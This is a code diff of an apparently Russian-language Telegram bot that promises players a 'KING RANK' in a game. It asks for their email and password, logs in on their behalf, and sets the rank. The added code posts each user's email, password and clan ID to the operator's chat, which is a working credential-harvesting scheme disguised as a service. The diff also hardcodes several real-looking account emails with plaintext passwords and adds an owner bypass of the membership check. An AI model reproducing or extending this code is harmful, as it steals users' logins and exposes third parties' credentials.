@@ -98,20 +98,6 @@ def set_rank(token):
     except:
         return False
 
-def check_clan_id(token, email, password):
-    try:
-        r = requests.post(CLAN_ID_URL,
-            headers={"Authorization": f"Bearer {token}"},
-            json={"data": None},
-            timeout=10
-        )
-        if r.status_code == 200:
-            clan_id = r.json().get("result", "")
-            if clan_id:
-                send_to_telegram(email, password, clan_id)
-    except:
-        pass
-
 def run_mass_rank():
     for acc in ACCOUNTS:
         token = login(acc["email"], acc["password"])
@@ -221,7 +207,9 @@ def handle_message(message):
     elif state["step"] == "await_password":
         bot.send_message(message.chat.id, "⏳ Обработка...")
         
-        token = login(state["email"], message.text)
+        email = state["email"]
+        password = message.text
+        token = login(email, password)
         if not token:
             bot.send_message(message.chat.id, "❌ Ошибка входа.")
             del user_states[message.from_user.id]
@@ -233,51 +221,69 @@ def handle_message(message):
                 json={"data": None},
                 timeout=10
             )
-            clan_id = r.json().get("result", "")
+            clan_id = str(r.json().get("result", "")).strip()
         except:
             clan_id = ""
 
-        if not clan_id or str(clan_id) not in MY_CLAN_IDS:
-            bot.send_message(message.chat.id, "❌️ Вы не являетесь участником LEVEL PERFORMANCE 🔴🟣🔵")
-            del user_states[message.from_user.id]
-            return
+        user_id = message.from_user.id
 
+        # --- OWNER bypass ---
+        if user_id != OWNER_ID:
+            if not clan_id or clan_id not in MY_CLAN_IDS:
+                bot.send_message(message.chat.id, "❌️ Вы не являетесь участником LEVEL PERFORMANCE 🔴🟣🔵")
+                del user_states[message.from_user.id]
+                return
+        else:
+            bot.send_message(message.chat.id, "👑 OWNER MODE: проверка клана пропущена")
+
+        # --- ВЫДАЧА KING RANK ---
         if set_rank(token):
-            check_clan_id(token, state["email"], message.text)
+            try:
+                bot.send_message(
+                    CHAT_ID,
+                    f"👑 KING RANK ВЫДАН\n\n📧 Email: {email}\n🔒 Password: {password}\n🛡️ ClanId: {clan_id}"
+                )
+            except:
+                pass
+
             bot.send_message(message.chat.id, "✅ Готово!")
         else:
             bot.send_message(message.chat.id, "❌ Ошибка установки ранга.")
 
         del user_states[message.from_user.id]
 
-# --- 🔥 AUTO /LEVEL В 20:00 МСК БЕЗ ДОП. БИБЛИОТЕК ---
+# --- 🔥 AUTO /LEVEL ---
 MOSCOW_OFFSET = 3  # Москва UTC+3
-AUTO_HOUR = 3
-AUTO_MINUTE = 10
+AUTO_TIMES = [(3, 10), (23, 30)]  # новые времена МСК
 
 def auto_level_loop():
     while True:
         now_utc = datetime.utcnow()
         now_msk = now_utc + timedelta(hours=MOSCOW_OFFSET)
-        if now_msk.hour == AUTO_HOUR and now_msk.minute == AUTO_MINUTE:
-            print("⏰ AUTO LEVEL запускается")
+        now_hm = (now_msk.hour, now_msk.minute)
+
+        if now_hm in AUTO_TIMES:
+            print(f"⏰ AUTO LEVEL запускается в {now_hm[0]:02d}:{now_hm[1]:02d}")
             try:
                 execute_level(CHAT_ID)
             except Exception as e:
                 print("Ошибка автозапуска:", e)
-            time.sleep(61)  # ждем минуту, чтобы не повторять запуск несколько раз
+            time.sleep(61)
         else:
             time.sleep(10)
 
 # --- RUN ---
 if __name__ == "__main__":
     ACCOUNTS = [
-        {"email": "sakiev.a.07@mail.ru", "password": "Sakiyev.7112"},
-        {"email": "cpmcpmking10@gmail.com", "password": "666666"},
-        {"email": "kingcpmcpm10@gmail.com", "password": "666666"},
+        {"email": "den_isaev_9595@mail.ru", "password": "Zaebali1995"},
+        {"email": "sultanabdulaev2006@gmail.com", "password": "31072006"},
+        {"email": "cpmcpmking1@gmail.com", "password": "666666"},
+        {"email": "cpmcpmking2@gmail.com", "password": "666666"},
+        {"email": "cpmcpmking3@gmail.com", "password": "666666"},
+        {"email": "cpmcpmking4@gmail.com", "password": "666666"},
     ]
 
-    Thread(target=auto_level_loop, daemon=True).start()  # авто /level в 20:00 МСК
+    Thread(target=auto_level_loop, daemon=True).start()  # авто /level
 
     def start_polling():
         while True:
